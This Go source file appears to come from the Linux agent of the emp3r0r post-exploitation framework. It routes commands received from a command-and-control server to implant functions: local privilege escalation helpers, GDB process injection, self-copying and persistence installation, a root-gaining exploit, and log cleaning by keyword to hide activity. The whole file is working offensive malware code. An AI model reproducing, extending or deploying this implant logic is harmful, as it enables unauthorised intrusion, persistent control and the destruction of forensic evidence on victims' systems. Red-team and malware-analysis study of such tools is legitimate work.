//go:build linux
// +build linux

package agent

import (
	"fmt"
	"log"
	"os"
	"strconv"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
)

func platformC2CommandsHandler(cmdSlice []string) (out string) {
	var err error

	switch cmdSlice[0] {

	case emp3r0r_data.C2CmdLPE:
		// LPE helper
		// !lpe script_name
		if len(cmdSlice) < 2 {
			out = fmt.Sprintf("args error: %s", cmdSlice)
			log.Printf(out)
			return
		}

		helper := cmdSlice[1]
		out = lpeHelper(helper)
		return

		// GDB inject
	case emp3r0r_data.C2CmdInject:
		if len(cmdSlice) != 3 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out = fmt.Sprintf("%s: success", cmdSlice[1])
		pid, err := strconv.ParseInt(cmdSlice[2], 10, 32)
		if err != nil {
			log.Print("Invalid pid")
		}
		err = InjectorHandler(int(pid), cmdSlice[1])
		if err != nil {
			out = "failed: " + err.Error()
		}
		return

		// persistence
	case emp3r0r_data.C2CmdPersistence:
		if len(cmdSlice) != 2 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		out = "Success"
		SelfCopy()
		if cmdSlice[1] == "all" {
			err = PersistAllInOne()
			if err != nil {
				log.Print(err)
				out = fmt.Sprintf("Result: %v", err)
			}
		} else {
			out = "No such method available"
			if method, exists := PersistMethods[cmdSlice[1]]; exists {
				out = "Success"
				err = method()
				if err != nil {
					log.Println(err)
					out = fmt.Sprintf("Result: %v", err)
				}
			}
		}
		return

		// get_root
	case emp3r0r_data.C2CmdGetRoot:
		if os.Geteuid() == 0 {
			out = "You already have root!"
		} else {
			err = GetRoot()
			out = fmt.Sprintf("LPE exploit failed:\n%v", err)
			if err == nil {
				out = "Got root!"
			}
		}
		return

		// log cleaner
	case emp3r0r_data.C2CmdCleanLog:
		if len(cmdSlice) != 2 {
			out = fmt.Sprintf("args error: %v", cmdSlice)
			return
		}
		keyword := cmdSlice[1]
		out = "Done"
		err = CleanAllByKeyword(keyword)
		if err != nil {
			out = err.Error()
		}
		return
	}

	return fmt.Sprintf("Unknown command %v", cmdSlice)
}
